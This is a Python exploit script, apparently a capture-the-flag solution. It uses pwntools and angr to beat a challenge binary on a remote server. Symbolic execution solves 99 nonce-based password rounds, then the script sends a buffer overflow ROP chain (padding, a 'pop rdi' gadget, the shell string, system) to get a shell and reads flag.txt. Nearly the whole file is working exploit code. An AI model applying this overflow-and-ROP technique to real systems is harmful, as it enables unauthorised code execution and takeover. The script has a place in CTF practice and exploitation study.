import angr
import claripy
import sys
from pwn import *

logging.getLogger('angr').setLevel(logging.WARNING)
logging.getLogger('os').setLevel(logging.WARNING)
logging.getLogger('pwnlib').setLevel(logging.WARNING)

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 14011)
    else:
        return process(e.path)


p = start()


def solve(t):

    p.recvuntil(b'Nonce 1:')
    random_val1 = int(p.recvline())
    info('Nonce 1: %i' % random_val1)
    p.recvuntil(b'Nonce 2:')
    random_val2 = int(p.recvline())
    info('Nonce 2: %i' % random_val2)

    project = angr.Project(binary)

    start_address = 0x40155e  
    initial_state = project.factory.blank_state(
        addr=start_address,
        add_options={angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                     angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS}
    )

    password = claripy.BVS('', 64)

    initial_state.regs.rdi = random_val1
    initial_state.regs.rsi = random_val2
    initial_state.regs.rdx = t
    initial_state.regs.rcx = password

    simulation = project.factory.simgr(initial_state)

    def is_successful(state):
        stdout_output = state.posix.dumps(sys.stdout.fileno())
        return 'Correct.'.encode() in stdout_output

    def should_abort(state):
        stdout_output = state.posix.dumps(sys.stdout.fileno())
        return 'Incorrect.'.encode() in stdout_output

    simulation.explore(find=is_successful, avoid=should_abort)

    if simulation.found:
        solution_state = simulation.found[0]
        solution = solution_state.solver.eval(password)
        info("Found solution: %i" % solution)
        p.sendline(b'%i' % solution)
        warn('Sent solution: %i for iteration: %i' % (solution, t))
        p.recvuntil(b'Continuing')
    else:
        raise Exception('Could not find the solution')


for i in range(1, 100):
    solve(i)

p.recvuntil(b'Throw Your Exploit')
print("Throwing Exploit")

pop_rdi = p64((r.find_gadget(['pop rdi', 'ret']))[0])
bin_sh = p64(e.sym['shell'])
system = p64(e.sym['system'])

pad = cyclic(16)
chain = pop_rdi
chain += bin_sh
chain += system

p.sendline(pad+chain)

p.sendline(b'cat flag.txt')
p.interactive()
